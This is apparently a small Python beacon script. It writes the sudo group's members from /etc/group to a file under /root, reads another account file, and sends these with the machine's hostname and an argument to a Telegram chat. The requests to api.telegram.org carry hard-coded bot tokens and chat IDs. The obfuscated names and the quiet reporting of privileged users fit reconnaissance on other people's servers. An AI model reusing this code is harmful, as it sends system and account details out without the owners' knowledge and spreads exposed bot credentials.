
import requests
import socket , sys ,os


print ('Argument List:', str(sys.argv))
os.system("echo  $(grep '^sudo:.*$' /etc/group | cut -d: -f4) > /root/h0t")

hostname_os=socket.getfqdn()
vversion="docker info "
goog="/root/g00g"
h00t="/root/h0t"

def read_current_acc_goo():
	with open(goog,'r') as file:
		lines = file.readlines()
		lines=lines[0].replace("\n","")
	return lines

def read_current_hosty():
	with open(h00t,'r') as file:
		lines = file.readlines()
		lines=lines[0].replace("\n","")
	return lines


def alias_send_msg(text):
	h0sty=read_current_hosty()
	hoost=read_current_acc_goo()
	msg_telegram="    [ "+hoost+" ]\n[ "+hostname_os+" ]   [ "+h0sty+" ] \n"+"[ "+text+" ] "+"[ "+vversion+" ] "
	# msg_telegram="    [ "+hoost+" ]                [   ] \n[  ]   [  ] "+"[ "+hostname_os+text+" ] "+"[ "+vversion+" ] "
	token="5351653833:AAEUeIwPT187sCG5vb33t_2JGHBlcLT-kNU"
	chat_id = "-723950994"
	# chat_id = "-1001616252735"
	url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + msg_telegram
	# url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + msg_telegram 

	results = requests.get(url_req)
########################################################################################################################

def send_msg_dock(text):

	msg_telegram="[ "+hostname_os +" ]"+text
	token = "5261450305:AAEROP9j6569RV4rKsE_tStXCdnLSX7Gz1Y"
	# chat_id = "-643828126"
	chat_id = "-615987943"
	url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + msg_telegram 
	results = requests.get(url_req)
	print(results.json())

alias_send_msg(sys.argv[1])